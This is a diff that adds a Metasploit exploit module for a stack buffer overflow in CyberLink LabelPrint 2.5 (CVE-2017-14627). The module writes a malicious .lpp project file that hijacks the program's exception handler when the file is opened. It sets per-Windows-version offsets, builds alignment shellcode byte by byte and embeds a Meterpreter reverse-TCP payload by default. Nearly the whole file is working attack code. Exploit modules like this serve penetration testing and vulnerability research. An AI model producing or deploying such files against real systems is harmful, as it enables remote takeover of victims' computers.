@@ -1,0 +1,166 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "CyberLink LabelPrint 2.5 Stack Buffer Overflow",
+      'Description'    => %q{
+        This module exploits a stack buffer overflow in CyberLink LabelPrint 2.5 and below.
+        The vulnerability is triggered when opening a .lpp project file containing overly long string characters
+        via open file menu. This results in overwriting a structured exception handler record and take over the
+        application. This module has been tested on Windows 7 (64 bit), Windows 8.1 (64 bit), and Windows 10 (64 bit).
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'modpr0be <tom@spentera.id>',       # initial discovery and metasploit module
+          'f3ci <marie@spentera.id>'          # unicode kungfu
+        ],
+      'References'      =>
+        [
+          [ 'CVE', '2017-14627' ],
+          [ 'EDB', '42777' ]
+        ],
+      'DefaultOptions'  =>
+        {
+          'FILENAME' => 'msf.lpp',
+          'EXITFUNC' => 'seh',
+          'DisablePayloadHandler' => 'true',
+          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
+        },
+      'Platform'        => 'win',
+      'Targets'         =>
+        [
+          ['CyberLink LabelPrint <= 2.5 on Windows 7 (64 bit)',
+            {
+              'Ret' => "\x2c\x44",
+              'Offset' => 790,
+              'Padding1' => 857,
+              'Padding2' => 104
+            }
+          ],
+          ['CyberLink LabelPrint <= 2.5 on Windows 8.1 x64',
+            {
+              'Ret' => "\x2c\x44",
+              'Offset' => 790,
+              'Padding1' => 845,
+              'Padding2' => 116
+            }
+          ],
+          ['CyberLink LabelPrint <= 2.5 on Windows 10 x64 build 1803',
+            {
+              'Ret' => "\x2c\x44",
+              'Offset' => 790,
+              'Padding1' => 781,
+              'Padding2' => 180
+            }
+          ],
+        ],
+      'Payload'         =>
+        {
+          'Space'       => 15000,
+          'DisableNops' => true
+        },
+      'DisclosureDate'  => 'Sep 23 2017',
+      'DefaultTarget'   => 0))
+  end
+
+  def get_payload(hunter)
+    enc = framework.encoders.create('x86/unicode_mixed')
+    enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })
+    hunter = enc.encode(hunter, nil, nil, platform)
+  end
+
+  def exploit
+    nop = "\x42"
+    junk = 'ABC'.split('').sample              #junk must specifically static (A, B, and C only)
+    buffer = ""
+    buffer << junk * target['Offset']
+    buffer << "\x61\x42"       # nseh
+    buffer << target['Ret']    # seh
+
+    #we need to encode the RET address, since RET (\xc3) is known as bad char.
+    #preparing address to land the decoded RET
+    buffer << nop              #nop/inc edx
+    buffer << "\x54"           #push esp
+    buffer << nop              #nop/inc edx
+    buffer << "\x58"           #pop eax
+    buffer << nop              #nop/inc edx
+    buffer << "\x05\x1B\x01"   #add eax 01001B00
+    buffer << nop              #nop/inc edx
+    buffer << "\x2d\x01\x01"   #sub eax 01001000
+    buffer << nop              #nop/inc edx
+    buffer << "\x50"           #push eax
+    buffer << nop              #nop/inc edx
+    buffer << "\x5c"           #pop esp
+
+    #preparing RET opcode (c300c300)
+    buffer << nop              #nop/inc edx
+    buffer << "\x25\x7e\x7e"   #and eax,7e007e00
+    buffer << nop              #nop/inc edx
+    buffer << "\x25\x01\x01"   #and eax,01000100
+    buffer << nop              #nop/inc edx
+    buffer << "\x35\x7f\x7f"   #xor eax,7f007f00
+    buffer << nop              #nop/inc edx
+    buffer << "\x05\x44\x44"   #add eax,44004400
+    buffer << nop              #nop/inc edx
+    buffer << "\x57"           #push edi as padding, needed to align stack
+    buffer << nop              #nop/inc edx
+    buffer << "\x50"           #push eax
+    buffer << junk * target['Padding1'] #OS specific
+
+    #custom venetian to reach shellcode
+    buffer << "\x58"           #pop eax
+    buffer << nop              #nop/inc edx
+    buffer << "\x58"           #pop eax
+    buffer << nop              #nop/inc edx
+    buffer << "\x05\x09\x01"   #depending OS
+    buffer << nop              #nop/inc edx
+    buffer << "\x2d\x01\x01"   #add eax, 01000100, this will align eax to our buffer
+    buffer << nop              #nop/inc edx
+    buffer << "\x50"           #push eax
+    buffer << nop              #nop/inc edx
+
+    #crafting call esp at 0x7c32537b (MFC71U.dll) to make a jump using call esp
+    buffer << "\x5C"           #pop esp
+    buffer << nop              #nop/inc edx
+    buffer << "\x58"           #pop eax
+    buffer << nop              #nop/inc edx
+    buffer << "\x05\x53\x7c"   #add eax 7c005300 part of call esp
+    buffer << nop              #nop/inc edx
+    buffer << "\x50"           #push eax
+    buffer << junk * target['Padding2'] #OS specific
+    buffer << "\x7b\x32"       #part of call esp
+
+    #preparing for jump to shellcode, placing in eax.
+    buffer << junk * 114       #junk
+    buffer << "\x57"           #push edi
+    buffer << nop              #nop/inc edx
+    buffer << "\x58"           #pop eax
+    buffer << nop              #nop/inc edx
+    buffer << "\x05\x0A\x01"   #depending OS
+    buffer << nop              #nop/inc edx
+    buffer << "\x2d\x01\x01"   #sub eax,01000100
+    buffer << nop              #nop/inc edx
+    buffer << get_payload(payload.encoded)
+    buffer << junk * (payload.space-buffer.length)      #fill the rest of buffer, must be added.
+
+    lpp_data = <<-EOS
+    <PROJECT version="1.0.00">
+      <INFORMATION title="" author="" date="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}" SystemTime="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}">
+        <TRACK name="#{buffer}" />
+      </INFORMATION>
+    </PROJECT>
+    EOS
+
+    print_status("Creating '#{datastore['FILENAME']}' file ...")
+    file_create(lpp_data)
+  end
+end
